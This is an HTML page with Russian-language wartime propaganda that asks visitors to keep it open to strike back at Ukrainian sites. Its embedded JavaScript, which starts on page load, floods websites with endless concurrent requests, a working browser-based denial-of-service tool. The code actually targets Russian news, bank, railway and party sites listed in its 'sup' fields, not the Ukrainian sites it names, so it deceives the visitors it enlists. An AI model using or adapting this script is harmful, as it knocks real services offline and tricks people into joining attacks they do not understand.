
<head>
  <meta charset="utf-8" />
  <title> Защити Россию от украинской кибератаки на важные сайты банков и новостей!</title>
</head>
<body>
  <h1>Защити Россию от украинской кибератаки на важные сайты банков и новостей!</h1>
  <table width="100%">
    <tr>
      <td width="30%">
        <h3>Нагружаем укро-новости!</h3>
        <p>«Украинцы запустили массовую атаку на самые важные сайты России. В том числе государственные сайты, новостные ресурсы и банковские сайты. Чтобы их остановить, мы должны нанести ответный удар

          Пожалуйста, откройте эту страницу на ваших устройствах. Это зальёт украинские сайты запросами и создаст огромную нагрузку на их инфраструктуру.
          
          Ваш браузер будет работать медленно. Все в порядке, не волнуйтесь и держите его открытым.</p>
      </td>
   </table>
   <div id="stats"></div>

<script>
var targets = {
  'https://www.pravda.com.ua/': { sup: 'https://lenta.ru/', number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.unian.net/': { sup: 'https://www.rbc.ru/', number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.liga.net/': { sup: 'https://www.rt.com/', number_of_requests: 0, number_of_errored_responses: 0 },
  'https://ukraine.segodnya.ua/': { sup: 'https://smotrim.ru/', number_of_requests: 0, number_of_errored_responses: 0 },
  'https://gordonua.com/news.html': { sup: 'https://tass.ru/', number_of_requests: 0, number_of_errored_responses: 0 },
  'https://censor.net': { sup: 'https://tvzvezda.ru/', number_of_requests: 0, number_of_errored_responses: 0 },
  'https://kp.ua/': { sup: 'https://www.vesti.ru/', number_of_requests: 0, number_of_errored_responses: 0 },
  'https://gazeta.ua/': { sup: 'https://online.sberbank.ru/', number_of_requests: 0, number_of_errored_responses: 0 },
  'https://bank.gov.ua/': { sup: 'https://www.rzd.ru/', number_of_requests: 0, number_of_errored_responses: 0 },
  'https://mon.gov.ua/ua': { sup: 'https://er.ru/', number_of_requests: 0, number_of_errored_responses: 0 }
}

var statsEl = document.getElementById('stats');
function printStats() {
  statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
}
setInterval(printStats, 1000);

var CONCURRENCY_LIMIT = 1000
var queue = []

async function fetchWithTimeout(resource, options) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    method: 'GET',
    mode: 'no-cors',
    signal: controller.signal
  }).then((response) => {
    clearTimeout(id);
    return response;
  }).catch((error) => {
    clearTimeout(id);
    throw error;
  });
}

async function flood(target) {
  for (var i = 0;; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift()
    }
    rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
    queue.push(
      fetchWithTimeout(targets[target].sup + rand, { timeout: 1000 })
        .catch((error) => {
          if (error.code === 20 /* ABORT */) {
            return;
          }
          targets[target].number_of_errored_responses++;
        })
        .then((response) => {
          if (response && !response.ok) {
            targets[target].number_of_errored_responses++;
          }
          targets[target].number_of_requests++;
        })

    )
  }
}

// Start
Object.keys(targets).map(flood)
</script>
</body>
    